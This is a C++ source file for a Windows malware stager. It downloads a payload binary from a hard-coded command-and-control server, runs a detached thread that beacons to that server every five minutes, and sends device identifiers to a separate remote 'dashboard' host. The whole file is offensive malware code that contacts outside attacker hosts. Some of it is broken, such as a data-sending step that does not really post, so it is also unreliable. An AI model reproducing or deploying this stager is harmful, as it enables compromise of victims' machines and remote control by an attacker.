// StagerBeacon.cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <wininet.h>
#include <thread>
#include <chrono>

#pragma comment(lib, "wininet.lib")

// Function to download the payload from the C2 server
void downloadPayload(const std::string& url, const std::string& outputFile) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "Failed to open internet session." << std::endl;
        return;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        std::cerr << "Failed to open URL." << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    std::ofstream file(outputFile, std::ios::binary);
    if (!file) {
        std::cerr << "Failed to create output file." << std::endl;
        InternetCloseHandle(hFile);
        InternetCloseHandle(hInternet);
        return;
    }

    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        file.write(buffer, bytesRead);
    }

    file.close();
    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
}

// Function to send a beacon to the C2 server
void sendBeacon(const std::string& url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "Failed to open internet session." << std::endl;
        return;
    }

    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        std::cerr << "Failed to open URL." << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
}

// Function to establish a persistent connection and handle commands
void establishPersistentConnection(const std::string& c2Server) {
    while (true) {
        sendBeacon(c2Server + "/beacon");
        std::this_thread::sleep_for(std::chrono::minutes(5));
    }
}

// Function to send device data to the dashboard
void sendDeviceData(const std::string& deviceId, const std::string& deviceName, const std::string& deviceIp) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "Failed to open internet session." << std::endl;
        return;
    }

    std::string url = "http://newmethod-abhopeful.wasmer.app/devices";
    HINTERNET hFile = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hFile) {
        std::cerr << "Failed to open URL." << std::endl;
        InternetCloseHandle(hInternet);
        return;
    }

    std::string postData = "{\"id\":\"" + deviceId + "\",\"name\":\"" + deviceName + "\",\"ip\":\"" + deviceIp + "\"}";
    DWORD bytesSent;
    InternetWriteFile(hFile, postData.c_str(), postData.length(), &bytesSent);

    InternetCloseHandle(hFile);
    InternetCloseHandle(hInternet);
}

int main() {
    // Example usage
    std::string c2Server = "https://newmethod-ish6.onrender.com";
    std::string payloadUrl = c2Server + "/payload.bin";
    std::string outputFile = "downloaded_payload.bin";

    // Download the payload
    downloadPayload(payloadUrl, outputFile);

    // Start the persistent connection in a separate thread
    std::thread persistentConnection(establishPersistentConnection, c2Server);
    persistentConnection.detach();

    // Send device data to the dashboard
    sendDeviceData("1", "Device 1", "192.168.1.2");

    std::cout << "Payload downloaded and beacon sent successfully." << std::endl;

    return 0;
}
